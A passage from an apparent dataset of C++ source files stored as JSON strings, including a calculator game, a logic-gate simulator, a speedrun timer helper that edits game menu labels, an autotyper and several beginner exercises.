oldUppery = uppery;\r\n    oldLowerx = lowerx;\r\n    oldLowery = lowery;\r\n}\r\n\r\nvoid PipePair::Move()\r\n{\r\n    //If the pipe goes of the screen\r\n    if (upperx + pipe_width <= 0)\r\n    {\r\n        upperx = LCD_WIDTH;\r\n        uppery = randInt(MIN_PIPE_VISIBILITY, MAX_PIPE_VISIBILITY);\r\n        lowery = uppery + VERTICAL_SPACE_BETWEEN_PIPES + pipe_height;\r\n\r\n        //Free the memory and allocate new memory.\r\n        free(behindUpper);\r\n        behindUpper = gfx_MallocSprite(pipe_width, LCD_HEIGHT + uppery);\r\n        free(behindLower);\r\n        behindLower = gfx_MallocSprite(pipe_width, LCD_HEIGHT - lowery);\r\n    }\r\n    else\r\n    {\r\n        upperx -= SCROLL_SPEED;\r\n    }\r\n        \r\n    lowerx = upperx;\r\n}\r\n\r\nvoid PipePair::Reset()\r\n{\r\n    upperx = originalUpperx;\r\n    uppery = randInt(MIN_PIPE_VISIBILITY, MAX_PIPE_VISIBILITY);\r\n    lowerx = originalUpperx;\r\n    lowery = uppery + VERTICAL_SPACE_BETWEEN_PIPES + pipe_height;\r\n\r\n    //Free the memory and allocate new memory.\r\n    free(behindUpper);\r\n    behindUpper = gfx_MallocSprite(pipe_width, LCD_HEIGHT + uppery);\r\n    free(behindLower);\r\n    behindLower = gfx_MallocSprite(pipe_width, LCD_HEIGHT - lowery);\r\n}\r\n",
    "#include <iostream>\n#include <string>\n#include <string.h>\n#include <typeinfo>\n#include \"Shape.h\"\n\nusing namespace std;\n\n\n//=========================================================================\n#define CPP_CODE_MSG (\"\\n[C++ Code], Shape::\")\n#define FUNC_START {cout<<CPP_CODE_MSG<<__FUNCTION__<<\"() started.[\"<<(void*)(this)<<\"]\"<<endl;}\n#define FUNC_END {cout<<CPP_CODE_MSG<<__FUNCTION__<<\"() exited.\"<<endl;}\n\n#define SHOW_NAME {                 \\\n    if(name)                        \\\n        cout<<CPP_CODE_MSG<<__FUNCTION__<<\"(), Shape's name =[\"<<(name)<<\"]\"<<endl;       \\\n    }                               \\\n    ;\n\n\n\n//=========================================================================\nShape::Shape(char* ptr):name(nullptr)\n{\n    {cout<<CPP_CODE_MSG<<\"Shape(char* ptr)() started.[\"<<(void*)(this)<<\"]\"<<endl;}\n    setName(ptr);\n    //SHOW_NAME;\n    FUNC_END;\n}\n\nShape::~Shape()\n{\n    {cout<<CPP_CODE_MSG<<\"~Shape() started.[\"<<(void*)(this)<<\"]\"<<endl;}\n    SHOW_NAME;\n    FUNC_END;\n}\n\nShape::Shape(const Shape &o) : name(nullptr)\n{\n    {cout<<CPP_CODE_MSG<<\"Shape(const Shape &o) started.[\"<<(void*)(this)<<\"]\"<<endl;}\n    setName(o.name);\n    SHOW_NAME;\n    FUNC_END;\n}\nShape& Shape::operator=(const Shape &o){\n    {cout<<CPP_CODE_MSG<<\"operator=(const Shape &o) started.[\"<<(void*)(this)<<\"]\"<<endl;}\n    setName(o.name);\n    SHOW_NAME;\n    FUNC_END;\n    return *this;\n}\n//============================================================\n\nvoid Shape::privateFunc(){\n    FUNC_START;\n    SHOW_NAME;\n    FUNC_END;\n}\n\nvoid Shape::protctedFunc(){\n    FUNC_START;\n    SHOW_NAME;    \n    FUNC_END;\n}\n\nvoid Shape::show()\n{\n    FUNC_START;\n    SHOW_NAME;    \n    FUNC_END;\n}\n\nchar* Shape::getName()\n{\n    FUNC_START;\n    SHOW_NAME;    \n    FUNC_END;\n    return name;\n}\n\n// Shape Shape::clone()\n// {\n//     FUNC_START;\n//     Rectangle r1(height,width);\n//     FUNC_END;\n//     return r1;\n// }\nvoid Shape::setName(const char* ptr)\n{\n    FUNC_START;\n    if(ptr)\n    {\n        auto len = strlen(ptr);\n        if(name)\n            delete[] name;\n        name = nullptr;\n        cout<<CPP_CODE_MSG<<\" input name = {\"<<ptr<<\"}, (void*)(ptr) = \"<<(void*)(ptr) <<endl;\n        \n        name = new char[len+1];\n        memcpy(name,ptr,len);\n        name[len]='\\0';\n        cout<<CPP_CODE_MSG<<\" new setName is = \"<<name <<\", (void*)(name) = \"<<(void*)(name)<<endl; \n    }\n    else\n    {\n        cout<<CPP_CODE_MSG<<\" char* is NULL  \"<<endl;\n    }\n    FUNC_END;\n}\n\nvoid Shape::copy(const Shape &src)\n{\n    FUNC_START;\n    setName(src.name);\n    FUNC_END;\n}\n\nbool Shape::classInfo()\n{\n    //FUNC_START;\n    {cout<<CPP_CODE_MSG<<__FUNCTION__<<\"() started.\"<<endl;}\n    cout<<CPP_CODE_MSG<<\"class details: \"<<typeid(Shape).name()<< endl;\n    FUNC_END;\n    return true;\n}\n\n//=========================================================================",
    "#include <iostream>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    char tipeRumah, jenisPembayaran;\r\n    long int hargaRumah = 0, angsuranPerBulan = 0, totalHargaKredit = 0;\r\n\r\n    // Meminta input dari pengguna\r\n    cout << \"Masukkan Tipe Rumah (A/B/C/D): \";\r\n    cin >> tipeRumah;\r\n    tipeRumah = toupper(tipeRumah);  // Mengubah input menjadi huruf besar\r\n\r\n    cout << \"Masukkan Jenis Pembayaran (T untuk Tunai, K untuk Kredit): \";\r\n    cin >> jenisPembayaran;\r\n    jenisPembayaran = toupper(jenisPembayaran);  // Mengubah input menjadi huruf besar\r\n\r\n    // Tentukan harga rumah berdasarkan tipe rumah\r\n    if (tipeRumah == 'A') {\r\n        hargaRumah = 50000000;\r\n        angsuranPerBulan = 500000;\r\n    } else if (tipeRumah == 'B') {\r\n        hargaRumah = 75000000;\r\n        angsuranPerBulan = 750000;\r\n    } else if (tipeRumah == 'C') {\r\n        hargaRumah = 85000000;\r\n        angsuranPerBulan = 850000;\r\n    } else if (tipeRumah == 'D') {\r\n        hargaRumah = 100000000;\r\n        angsuranPerBulan = 1000000;\r\n    } else {\r\n        cout << \"Tipe rumah tidak valid!\" << endl;\r\n        return 1;  // Keluar dari program jika tipe rumah tidak valid\r\n    }\r\n\r\n    // Proses pembayaran\r\n    if (jenisPembayaran == 'T') {\r\n        // Pembayaran Tunai\r\n        cout << \"Harga Rumah (Tunai): Rp. \" << hargaRumah << endl;\r\n    } else if (jenisPembayaran == 'K') {\r\n        // Pembayaran Kredit\r\n        totalHargaKredit = angsuranPerBulan * 120; // Kredit selama 10 tahun (120 bulan)\r\n        cout << \"Angsuran per bulan: Rp. \" << angsuranPerBulan << endl;\r\n        cout << \"Total Harga Rumah (Kredit): Rp. \" << totalHargaKredit << endl;\r\n    } else {\r\n        cout << \"Jenis pembayaran tidak valid!\" << endl;\r\n        return 1;  // Keluar dari program jika jenis pembayaran tidak valid\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"timedLogicPrimitives.h\"\r\n#include \"timedLogicFunctions.h\"\r\n\r\n#define MAX(a,b) ((a>b)?a:b)\r\n\r\nint calculateEventTime(char lastValue, char newValue,\r\n\tint in1LastEvent, int in2LastEvent, int gateDelay, int lastEvent){\r\n\r\n\tif (lastValue == newValue) \r\n\t\treturn lastEvent;\r\n\telse \r\n\t\treturn gateDelay + MAX (in1LastEvent, in2LastEvent);\r\n}\r\n\r\nint calculateEventTime(char lastValue, char newValue,\r\n\tint in1LastEvent, int gateDelay, int lastEvent){\r\n\r\n\tif (lastValue == newValue) \r\n\t\treturn lastEvent;\r\n\telse \r\n\t\treturn gateDelay + in1LastEvent;\r\n}\r\n\r\nvoid AND::evl () {\r\n\r\n\tif ((i1->value == '0') || (i2->value == '0')) \r\n\t\to1->value = '0';\r\n\telse if ((i1->value == '1') && (i2->value == '1')) \r\n\t\to1->value = '1';\r\n\telse \r\n\t\to1->value='X';\r\n\r\n\to1->eventTime = calculateEventTime(lastValue, o1->value,\r\n\t\ti1->eventTime, i2->eventTime, gateDelay, lastEvent);\r\n\r\n\to1->activityCount = i1->activityCount + i2->activityCount +\r\n\t\t((lastValue == o1->value) ? 0 : 1);\r\n\t\r\n\tlastEvent = o1->eventTime;\r\n\tlastValue = o1->value; \r\n}\r\n\r\nvoid OR::evl () {\r\n\r\n\tif ((i1->value == '1') || (i2->value == '1')) \r\n\t\to1->value = '1';\r\n\telse if ((i1->value=='0')&&(i2->value=='0')) \r\n\t\to1->value='0';\r\n\telse \r\n\t\to1->value='X';\r\n\r\n\to1->eventTime = calculateEventTime(lastValue, o1->value,\r\n\t\ti1->eventTime, i2->eventTime, gateDelay, lastEvent);\r\n\r\n\to1->activityCount = i1->activityCount + i2->activityCount +\r\n\t\t((lastValue == o1->value) ? 0 : 1);\r\n\r\n\tlastEvent = o1->eventTime; \r\n\tlastValue = o1->value;\r\n}\r\n\r\nvoid NOT::evl () {\r\n\r\n\tif (i1->value=='0') \r\n\t\to1->value='1';\r\n\telse if (i1->value=='1') \r\n\t\to1->value='0';\r\n\telse \r\n\t\to1->value='X';\r\n\r\n\to1->eventTime = calculateEventTime(lastValue, o1->value,\r\n\t\ti1->eventTime, gateDelay, lastEvent);\r\n\r\n\to1->activityCount = i1->activityCount + \r\n\t\t((lastValue == o1->value) ? 0 : 1);\r\n\r\n\tlastEvent = o1->eventTime;\r\n\tlastValue = o1->value;\r\n}\r\n\r\nvoid XOR::evl () {\r\n\r\n\tif ((i1->value == 'X') || (i2->value == 'X') ||\r\n\t\t(i1->value == 'Z') || (i2->value == 'Z')) \r\n\t\to1->value = 'X';\r\n\telse if (i1->value==i2->value) \r\n\t\to1->value='0';\r\n\telse \r\n\t\to1->value='1';\r\n\r\n\to1->eventTime = calculateEventTime(lastValue, o1->value,\r\n\t\ti1->eventTime, i2->eventTime, gateDelay, lastEvent);\r\n\r\n\to1->activityCount = i1->activityCount + i2->activityCount +\r\n\t\t((lastValue == o1->value) ? 0 : 1);\r\n\r\n\tlastEvent = o1->eventTime;\r\n\tlastValue = o1->value;\r\n}\r\n\r\nvoid dff_ar::evl() {\r\n\r\n\tif (R->value == '1') {\r\n\t\tQ->value = '0';\r\n\t\tQ->eventTime = calculateEventTime(lastValue, Q->value,\r\n\t\t\tR->eventTime, rstQDelay, lastEvent);\r\n\t}\r\n\telse if (clk->value == 'P') {\r\n\t\tQ->value = D->value;\r\n\t\tQ->eventTime = calculateEventTime(lastValue, Q->value,\r\n\t\t\tclk->eventTime, clkQDelay, lastEvent);\r\n\t}\r\n\r\n\tQ->activityCount = D->activityCount + 2 +\r\n\t\t((lastValue == Q->value) ? 0 : 3);\r\n\r\n}\r\n\r\n// Structures based on above primitives begin here\r\n\r\nvoid fullAdder::evl () {\r\n\r\n\t// Via the FA pointers, read wire values that connect to\r\n\t// the FA from outside, and assign them to FA Local wires\r\n\taL = *i1; bL = *i2; ciL = *i3;\r\n\r\n\t// Evaluate gates in the proper order\r\n\txor1->evl();\r\n\tand1->evl();\r\n\tand2->evl();\r\n\tor1->evl();\r\n\txor2->evl();\r\n\t\t\r\n\t// Take calculated local wire values and assign the values \r\n\t// to the outside wires via pointers of FA\r\n\t*o1 = coL; *o2 = sumL;\r\n}\r\n\r\nvoid halfAdder::evl () {\r\n\t\r\n\t// Via the HA pointers, read wire values that connect to\r\n\t// the HA from outside, and assign them to HA Local wires\r\n\taL = *i1; bL = *i2; \r\n\r\n\t// Evaluate gates in the proper order\r\n\txor1->evl();\r\n\tand1->evl();\r\n\r\n\t// Take calculated local wire values and assign the values \r\n\t// to the outside wires via pointers of FA\r\n\t*o1 = coL; *o2 = sumL;\r\n}\r\n",
    "#include \"panorama.h\"\n\nvoid editMainMenu(HANDLE processHandle, uintptr_t panoramaBaseAddress, uintptr_t gameoverlayrenderer64BaseAddress)\n{\n    //uintptr_t scriptAddress = ResolvePointerChain(processHandle, panoramaBaseAddress + 0x004F4E58, scriptOffsets);\n    //WriteProcessMemory(processHandle, (LPVOID)scriptAddress, \"map wakeup_trigger\", 32, NULL);\n\n    //uintptr_t labelAddress = ResolvePointerChain(processHandle, panoramaBaseAddress + 0x004F4B00, labelOffsets);\n    //std::cout << std::hex << labelAddress << std::dec << std::endl;\n    //WriteProcessMemory(processHandle, (LPVOID)labelAddress, \"START SPEEDRUN\", 32, NULL); // 32 bytes is limit for this type of strings for engine, higher value can cause many errors\n}\n\nvoid start_loglabel(HANDLE processHandle, uintptr_t panoramaBaseAddress, LPCVOID mapAddress, ServerSplitter::Timer& timer) {\n    // wait till game loads.\n    for (int value = 0; value != MAP_MAIN_MENU; ReadProcessMemory(processHandle, mapAddress, &value, sizeof(value), nullptr)) {}\n    uintptr_t loglabelRedAddress = ResolvePointerChain(processHandle, panoramaBaseAddress + 0x004F4E58, loglabelRedOffsets);\n    uintptr_t loglabelGreenAddress = ResolvePointerChain(processHandle, panoramaBaseAddress + 0x004F4E58, loglabelGreenOffsets);\n    std::cout << \"green address: \" << std::hex << loglabelGreenAddress << std::dec << std::endl;\n    for (char value[64] = \"null\"; true; ReadProcessMemory(processHandle, (LPCVOID)loglabelGreenAddress, &value, sizeof(value) - 1, nullptr)) {\n        std::string str = value;\n        if (str == \"    LiveSplit connected! \") {\n            break;\n        }\n    }\n    std::cout << \"ready.\\n\";\n    WriteProcessMemory(processHandle, (LPVOID)loglabelGreenAddress, \"                              \", 31, NULL); // makes green loglabel invisible\n    WriteProcessMemory(processHandle, (LPVOID)loglabelRedAddress, \"                                       \", 40, NULL);\n    //WriteProcessMemory(processHandle, (LPVOID)loglabelRedAddress, \"LiveSplit is not connected! \", 29, NULL);\n    //Sleep(5000);\n\n    while (true) {\n        try {\n            timer.sendCommand(\"switchto gametime\");\n            //std::cout << \"LiveSplit connected!\\n\";\n            WriteProcessMemory(processHandle, (LPVOID)loglabelGreenAddress, \"                              \", 31, NULL);\n            WriteProcessMemory(processHandle, (LPVOID)loglabelRedAddress, \"                                       \", 40, NULL);\n            WriteProcessMemory(processHandle, (LPVOID)loglabelGreenAddress, \"LiveSplit connected! \", 31, NULL);\n        }\n        catch (std::runtime_error& ex) {\n            //std::cout << \"LiveSplit is not connected!\\n\";\n            WriteProcessMemory(processHandle, (LPVOID)loglabelRedAddress, \"                                       \", 40, NULL);\n            WriteProcessMemory(processHandle, (LPVOID)loglabelGreenAddress, \"                             \", 30, NULL);\n            WriteProcessMemory(processHandle, (LPVOID)loglabelRedAddress, \"LiveSplit is not connected! \", 29, NULL);\n            //std::cout << ex.what() << std::endl;\n            timer = ServerSplitter::createTimer();\n        }\n        Sleep(2000);\n    }\n}",
    "/* 1.\u7c7b\u8fd0\u7b97\u7b26\u91cd\u8f7d.cpp */\n//\u6709\u590d\u6570\u7c7bComplex\uff0c\u5229\u7528\u8fd0\u7b97\u7b26\u91cd\u8f7d\u5b9e\u73b0\u590d\u6570\u7684\u52a0\u3001\u51cf\u3001\u4e58\u3001\u9664\u7b49\u590d\u6570\u8fd0\u7b97\u3002\n#include <iostream>\nusing namespace std;\nclass Complex {\nprivate:\n  double r, i;\n\npublic:\n  Complex(double R = 0, double I = 0) : r(R), i(I){};\n  Complex operator+(Complex b);\n  Complex operator-(Complex b);\n  Complex operator*(Complex b);\n  Complex operator/(Complex b);\n  void display();\n};\n\nComplex Complex::operator+(Complex b) { return Complex(r + b.r, i + b.i); }\nComplex Complex::operator-(Complex b) { return Complex(r - b.r, i - b.i); }\n//\u6c42\u590d\u6570\u76f8\u4e58\u7684\u7b97\u6cd5\nComplex Complex::operator*(Complex b) {\n  Complex t;\n  t.r = r * b.r - i * b.i;\n  t.i = r * b.i + i * b.r;\n  return t;\n}\n//\u6c42\u590d\u6570\u76f8\u9664\u7684\u7b97\u6cd5\nComplex Complex::operator/(Complex b) {\n  Complex t;\n  double x;\n  x = 1 / (b.r * b.r + b.i * b.i);\n  t.r = x * (r * b.r + i * b.i);\n  t.i = x * (i * b.r - r * b.i);\n  return t;\n}\nvoid Complex::display() {\n  cout << r;\n  if (i > 0)\n    cout << \"+\";\n  if (i != 0)\n    cout << i << \"i\" << endl;\n  //}display();\n};\n\nint main(void) {\n  Complex c1(1, 2), c2(3, 4), c3, c4, c5, c6;\n  Complex a, b(2, 3);\n  a = b + 2; //\u6b63\u786e\n  // a=2+b;       \t\t\t//\u9519\u8bef\n  a.display();\n  c3 = c1 + c2;\n  c4 = c1 - c2;\n  c5 = c1 * c2;\n  c6 = c1 / c2;\n  c1.display();\n  c2.display();\n  c3.display();\n  c4.display();\n  c5.display();\n  c6.display();\n  \n  return 0;\n}\n",
    "#include <iostream>\r\n#include <math.h>\r\n#include <string>\r\n#include <fstream>\r\n\r\n// coded by Jormun 20240621\r\n\r\nnamespace obs\r\n{\r\n    float pi = 3.1415926, time = 0, dt = 0.01, end = 1, ma, re;\r\n\r\n    template <int S, int P>\r\n    struct cubit\r\n    {\r\n        cubit *idx_0, *idx_1, *idx_2, *idx_3;\r\n        int flg_0 = 0, flg_1 = 0, flg_2 = 0, flg_3 = 0;\r\n\r\n        float spect[3][4][S]; // r d\r\n        float value[4][P][P], value_x[4][P][P], value_y[4][P][P];\r\n        float base[S][P][P], base_x[S][P][P], base_y[S][P][P];\r\n        float test[S][P][P], test_x[S][P][P], test_y[S][P][P];\r\n        float q[4][2], n[4][2], pos[2][P][P]; // quadrant normal positon\r\n\r\n        float legendre(float ps, int k)\r\n        {\r\n            if (k == -1)\r\n                return 0.0;\r\n            else if (k == 0)\r\n                return 1.0;\r\n            else\r\n                return ((2 * k - 1) * ps * legendre(ps, k - 1) - (k - 1) * legendre(ps, k - 2)) / k;\r\n        }\r\n\r\n        float degendre(float ps, int k)\r\n        {\r\n            if (k == -1)\r\n                return 0.0;\r\n            else if (k == 0)\r\n                return 0.0;\r\n            else\r\n                return ((2 * k - 1) * (ps * degendre(ps, k - 1) + legendre(ps, k - 1)) - (k - 1) * degendre(ps, k - 2)) / k;\r\n        }\r\n\r\n        void convection_x(float cx[4], int p0, int p1)\r\n        {\r\n            float u[4], pres, alpha, nn, cxn[4], un[4], presn, alphan;\r\n            u[0] = value[0][p0][p1], u[1] = value[1][p0][p1], u[2] = value[2][p0][p1], u[3] = value[3][p0][p1];\r\n            pres = 0.4 * u[3] - 0.2 * u[1] * u[1] / u[0] - 0.2 * u[2] * u[2] / u[0],\r\n            cx[0] = u[1], cx[1] = u[1] * u[1] / u[0] + pres, cx[2] = u[1] * u[2] / u[0], cx[3] = u[1] / u[0] * (u[3] + pres);\r\n            int flg;\r\n            if (p0 == 0)\r\n                un[0] = idx_0->value[0][P - 1][p1], un[1] = idx_0->value[1][P - 1][p1], un[2] = idx_0->value[2][P - 1][p1], un[3] = idx_0->value[3][P - 1][p1], nn = n[1][0], flg = flg_0;\r\n            else if (p0 == P - 1)\r\n                un[0] = idx_1->value[0][0][p1], un[1] = idx_1->value[1][0][p1], un[2] = idx_1->value[2][0][p1], un[3] = idx_1->value[3][0][p1], nn = n[3][0], flg = flg_1;\r\n            else if (p1 == 0)\r\n                un[0] = idx_2->value[0][p0][P - 1], un[1] = idx_2->value[1][p0][P - 1], un[2] = idx_2->value[2][p0][P - 1], un[3] = idx_2->value[3][p0][P - 1], nn = n[2][0], flg = flg_2;\r\n            else if (p1 == P - 1)\r\n                un[0] = idx_3->value[0][p0][0], un[1] = idx_3->value[1][p0][0], un[2] = idx_3->value[2][p0][0], un[3] = idx_3->value[3][p0][0], nn = n[0][0], flg = flg_3;\r\n            else\r\n                return;\r\n            if (flg == 0)\r\n            {\r\n                presn = 0.4 * un[3] - 0.2 * un[1] * un[1] / un[0] - 0.2 * un[2] * un[2] / un[0],\r\n                cxn[0] = un[1], cxn[1] = un[1] * un[1] / un[0] + presn, cxn[2] = un[1] * un[2] / un[0], cxn[3] = un[1] / un[0] * (un[3] + presn);\r\n                alpha = sqrt((u[1] * u[1] + u[2] * u[2]) / (u[0] * u[0])) + sqrt(1.4 * pres / u[0]), alphan = sqrt((un[1] * un[1] + un[2] * un[2]) / (un[0] * un[0])) + sqrt(1.4 * presn / un[0]),\r\n                alpha = std::max(alpha, alphan);\r\n                for (int d = 0; d < 4; ++d)\r\n                    cx[d] = 0.5 * (cx[d] + cxn[d]) - 0.5 * alpha * nn * (u[d] - un[d]);\r\n            }\r\n            else\r\n                return;\r\n        }\r\n\r\n        void convection_y(float cy[4], int p0, int p1)\r\n        {\r\n            float u[4], pres, alpha, nn, cyn[4], un[4], presn, alphan;\r\n            u[0] = value[0][p0][p1], u[1] = value[1][p0][p1], u[2] = value[2][p0][p1], u[3] = value[3][p0][p1];\r\n            pres = 0.4 * u[3] - 0.2 * u[1] * u[1] / u[0] - 0.2 * u[2] * u[2] / u[0],\r\n            cy[0] = u[2], cy[1] = u[1] * u[2] / u[0], cy[2] = u[2] * u[2] / u[0] + pres, cy[3] = u[2] / u[0] * (u[3] + pres);\r\n            int flg;\r\n            if (p0 == 0)\r\n                un[0] = idx_0->value[0][P - 1][p1], un[1] = idx_0->value[1][P - 1][p1], un[2] = idx_0->value[2][P - 1][p1], un[3] = idx_0->value[3][P - 1][p1], nn = n[1][1], flg = flg_0;\r\n            else if (p0 == P - 1)\r\n                un[0] = idx_1->value[0][0][p1], un[1] = idx_1->value[1][0][p1], un[2] = idx_1->value[2][0][p1], un[3] = idx_1->value[3][0][p1], nn = n[3][1], flg = flg_1;\r\n            else if (p1 == 0)\r\n                un[0] = idx_2->value[0][p0][P - 1], un[1] = idx_2->value[1][p0][P - 1], un[2] = idx_2->value[2][p0][P - 1], un[3] = idx_2->value[3][p0][P - 1], nn = n[2][1], flg = flg_2;\r\n            else if (p1 == P - 1)\r\n                un[0] = idx_3->value[0][p0][0], un[1] = idx_3->value[1][p0][0], un[2] = idx_3->value[2][p0][0], un[3] = idx_3->value[3][p0][0], nn = n[0][1], flg = flg_3;\r\n            else\r\n                return;\r\n            if (flg == 0)\r\n            {\r\n                presn = 0.4 * un[3] - 0.2 * un[1] * un[1] / un[0] - 0.2 * un[2] * un[2] / un[0],\r\n                cyn[0] = un[2], cyn[1] = un[1] * un[2] / un[0], cyn[2] = un[2] *",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <fstream>\n#include <string>\n\nusing namespace std;\n\n//Global Variables\nint* numbers; //Pointer to a numbers array.\nstring* strings; //Pointer to a string array.\n\nclass SaveSystem \n{\n\tpublic:\n\t\tstring filename = \"save.txt\";\n\t\tstring line;\n\t\tbool fileExists = false;\n\t\tint fileLength = 0;\n};\n\nSaveSystem generalInfo;\n\nvoid checkForSave() \n{\n\tifstream saveFile(generalInfo.filename);\n\tgeneralInfo.fileExists = saveFile.is_open();\n\tsaveFile.close();\n}\n\nvoid writeFile() \n{\n\tstring line;\n\n\tcout << \"No save data exists yet.\" << endl;\n\tcout << \"First enter the type of string you whish to use, then the names of each string\" << endl;\n\tcout << \"If you have entered all your strings, type esc to stop!\" << endl;\n\n\tofstream saveFile(generalInfo.filename);\n\twhile(true)\n\t{\n\t\tcin >> line;\n\t\tif (line == \"esc\") \n\t\t{\n\t\t\tbreak;\n\t\t}\n\t\tsaveFile << line << endl;\n\t}\n\tsaveFile.close();\n}\n\nvoid getFileLength()\n{\n\tstring line;\n\n\tifstream saveFile(generalInfo.filename);\n\twhile(getline(saveFile, line)) //As soon as no new lines can be read the function is quit\n\t{\n\t\tgeneralInfo.fileLength++;\n\t}\n\tsaveFile.close();\n}\n\nvoid readFile(int numStrings)\n{\n\tstring line;\n\tint i = 0;\n\n\t//Allocate memory\n\tstrings = new string[numStrings];\n\n\tifstream saveFile(generalInfo.filename);\n\twhile(getline(saveFile, line))\n\t{\n\t\tstrings[i] = line;\n\t\ti++;\n\t}\n\tsaveFile.close();\n}\n\nvoid writeToConsole()\n{\n\tcout << \"Content of the file:\" << endl;\n\tfor (int i=0; i < generalInfo.fileLength; i++)\n\t{\n\t\tcout << strings[i] << endl;\n\t}\n}\n\nint main () \n{\n\tcheckForSave();\n\tcout << generalInfo.fileExists << endl; //debug only\n\tif (generalInfo.fileExists==false) \n\t{\n\t\twriteFile();\n\t}\n\telse if (generalInfo.fileExists==true) \n\t{\n\t\tgetFileLength();\n\t\tcout << generalInfo.fileLength << endl; //debug only\n\t\treadFile(generalInfo.fileLength);\n\t\twriteToConsole(); //For demonstration purposes only\n\t}\n\t//deallocate memory\n\tdelete[] strings;\n\treturn 0;\n}\n",
    "\ufeff#include <iostream>\n#include <fstream>\n#include <string>\n\nclass LogCommand {\npublic:\n    virtual ~LogCommand() = default;\n    virtual void print(const std::string& message) = 0;\n};\n\nclass ConsoleLogCommand : public LogCommand {\npublic:\n    void print(const std::string& message) override {\n        std::cout << message << std::endl;\n    }\n};\n\nclass FileLogCommand : public LogCommand {\npublic:\n    FileLogCommand(const std::string& filePath) : filePath(filePath) {}\n\n    void print(const std::string& message) override {\n        std::ofstream file(filePath, std::ios::app); \n        if (file.is_open()) {\n            file << message << std::endl;\n            file.close();\n        }\n        else {\n            std::cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u0444\u0430\u0439\u043b: \" << filePath << std::endl;\n        }\n    }\n\nprivate:\n    std::string filePath;\n};\n\nvoid print(LogCommand& logCommand, const std::string& message) {\n    logCommand.print(message);\n}\n\nint main() {\n    setlocale(LC_ALL, \"RU\");\n    ConsoleLogCommand consoleLog;\n    FileLogCommand fileLog(\"log.txt\");\n\n    print(consoleLog, \"\u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u043a\u043e\u043d\u0441\u043e\u043b\u0438\");\n\n    print(fileLog, \"\u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0444\u0430\u0439\u043b\u0430\");\n\n    return 0;\n}\n",
    "#include <iostream>  \r\n#include <windows.h>  \r\n#include <fstream>\r\n#include <vector>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\n\r\nvector<WORD> key;\r\n\r\nvoid simulateKeyPress(WORD key) {  \r\n\tINPUT input = {0};  \r\n\tinput.type = INPUT_KEYBOARD;  \r\n\tinput.ki.wVk = key;  \r\n\t\r\n\t// \u6a21\u62df\u6309\u4e0b\u952e  \r\n\tSendInput(1, &input, sizeof(INPUT));  \r\n\t\r\n\t// \u6a21\u62df\u91ca\u653e\u952e  \r\n\tinput.ki.dwFlags = KEYEVENTF_KEYUP;  \r\n\tSendInput(1, &input, sizeof(INPUT));  \r\n}  \r\n\r\nvoid readFile()\r\n{\r\n\tifstream ifs;\r\n\tifs.open(\"keystroke.txt\", ios::in);\r\n\twhile(!(ifs.eof()))\r\n\t{\r\n\t\tstring hexString=\"//\";\r\n\t\tWORD hexValue;\r\n\t\tstringstream ss; // \u4f7f\u7528 stringstream \u6765\u8f6c\u6362\u5b57\u7b26\u4e32\r\n\t\tifs >> hexString;\r\n\r\n\t\tif (hexString.find(\"0x\") == 0)\r\n\t\t{\r\n\t\t\tss << hex << hexString; // \u5c06\u5b57\u7b26\u4e32\u89c6\u4e3a\u5341\u516d\u8fdb\u5236  \r\n\t\t\tss >> hexValue; // \u8bfb\u53d6\u8f6c\u6362\u540e\u7684\u503c  \r\n\t\t}\r\n\t\telse if(hexString.find(\"//\") == string::npos)\r\n\t\t\thexValue=WORD(hexString[0]);\r\n\t\telse\r\n\t\t\tbreak;\r\n\t\t\r\n\t\tif(hexValue!=0)\r\n\t\t\tkey.push_back(hexValue);\r\n\t}\t\t\r\n\tifs.close();\r\n}\r\n\r\nint main() {  \r\n\tHANDLE hOutput;\r\n\tCOORD coord = { 0,0 };\r\n\thOutput = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\t\r\n\tCONSOLE_CURSOR_INFO cci;\r\n\tcci.bVisible = 0;\r\n\tcci.dwSize = 1;\r\n\t\r\n\treadFile();\r\n\t\r\n\tcout<<\"\u8f93\u5165\u8981\u5faa\u73af\u8f93\u5165\u7684\u6b21\u6570:\"<<endl;\r\n\tint n;\r\n\tcin>>n;\r\n\t\r\n\tsystem(\"cls\");\r\n\tSetConsoleCursorInfo(hOutput, &cci);\r\n\t// \u7b49\u5f856\u79d2\u949f\uff0c\u4ee5\u4fbf\u7528\u6237\u53ef\u4ee5\u5207\u6362\u5230\u76ee\u6807\u7a97\u53e3  \r\n\tfor(int i=5;i>=0;i--)\r\n\t{\r\n\t\tSetConsoleCursorPosition(hOutput, coord);\r\n\t\tcout<<\"\u8bf7\u5207\u6362\u81f3\u76ee\u6807\u8f93\u5165\u7a97\u53e3\"<<endl;\r\n\t\tcout<<i;\r\n\t\tSleep(1000);\r\n\t}\r\n\t\r\n\tsystem(\"cls\");\r\n\tcout<<\"\u6b63\u5728\u8f93\u5165\u2026\u2026\";\r\n\t\r\n\t\r\n\t\r\n\t\r\n\tfor(int i=0;i<n;i++)\r\n\t{\t\t\r\n\t\tfor (int j = 0; j < key.size(); j++)\r\n\t\t{\r\n\t\t\tsimulateKeyPress(key[j]);  \r\n\t\t\tSleep(100); \r\n\t\t}\r\n\t\t\r\n\t}\r\n\t\r\n\tsystem(\"cls\");\r\n\tcout<<\"\u8f93\u5165\u5b8c\u6210\"<<endl<<endl;\r\n\t\r\n\tsystem(\"pause\");\r\n\treturn 0;  \r\n}\r\n",
